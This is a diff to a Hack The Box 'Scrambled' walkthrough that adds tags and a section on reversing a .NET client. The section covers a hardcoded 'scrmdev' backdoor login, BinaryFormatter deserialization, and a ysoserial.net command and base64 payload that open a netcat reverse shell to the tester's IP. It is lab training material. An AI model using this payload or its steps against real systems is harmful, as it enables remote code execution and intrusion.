@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/scrambled.png
-tags: ["HTB"]
+tags: ["HTB", "domain-controller", "kerberos", "ldap", "ldapsearch", "impacket", "kerberoast", "hashcat", "mssql", "silver-ticket", "crackstation", "python", "ticketer", "klist", "mssqlclient", "winrm", "reverse-engineering", "wireshark", "dnspy", "deserialization", "ysoserial.net"]
 ---
 
 # Scrambled
@@ -807,4 +807,73 @@ ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS
 
 ![](./images/10.png)
 
-- 
+- I ran the app from the Windows host
+  - Tried using the creds we found, but they didn't work
+
+![](./images/11.png)
+
+![](./images/12.png)
+
+- If we intercept the packets via `Wireshark`, we can see that it's a text-based protocol
+
+![](./images/13.png)
+
+- The `Logon` function from `LoginWindow` calls `Logon` function in `ScrambleNetClient`
+  - We see the backdoor with `scrmdev` user
+
+![](./images/14.png)
+
+![](./images/15.png)
+
+- When we use `scrmdev` username for login, we have a success
+
+![](./images/16.png)
+
+- Check the packets in `Wireshark`
+  - We sent `LIST_ORDERS;` and received `base64` output
+  - Which looks like a serialized data
+
+![](./images/17.png)
+
+![](./images/18.png)
+
+- When we upload a new order, we generate a serialized object and send it in format `UPLOAD_ORDER;<BASE64-ENCRYPTED-DATA>`
+
+![](./images/19.png)
+
+![](./images/20.png)
+
+![](./images/21.png)
+
+- We could also see the same thing if we turn on `debug` mode in application
+  - `Tools` -> `Enable Debug Logging`
+  - When we perform operations, all logs will be saved in `ScrambleDebugLog.txt` file
+
+![](./images/22.png)
+
+- We can look for `Upload` functionality in `dnspy`
+  - `UploadOrder` function from `SalesOrder`, calls `SerializeToBase64` 
+  - It uses [BinaryFormatter](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide) which is risky according to `Microsoft`
+
+![](./images/23.png)
+
+![](./images/24.png)
+
+- So let's generate payload using `ysoserial` and perform `deserialization` attack
+  - https://github.com/pwntester/ysoserial.net
+  - `.\ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c "C:\\programdata\\nc64.exe 10.10.16.9 6666 -e cmd.exe"`
+```
+D:\Tools\ysoserial-1.35\Release>.\ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c "C:\\programdata\\nc.exe 10.10.16.9 6666 -e cmd.exe"
+AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL8DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA4QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIEM6XFxwcm9ncmFtZGF0YVxcbmMuZXhlIDEwLjEwLjE2LjkgNjY2NiAtZSBjbWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL
+```
+
+- Now launch listener
+  - Then connect to server via `nc`
+    - `nc 10.10.11.168 4411`
+    - And send `UPLOAD_ORDER;<PAYLOAD>`
+
+![](./images/25.png)
+
+- If we check our listner, we have a connection
+
+![](./images/26.png)
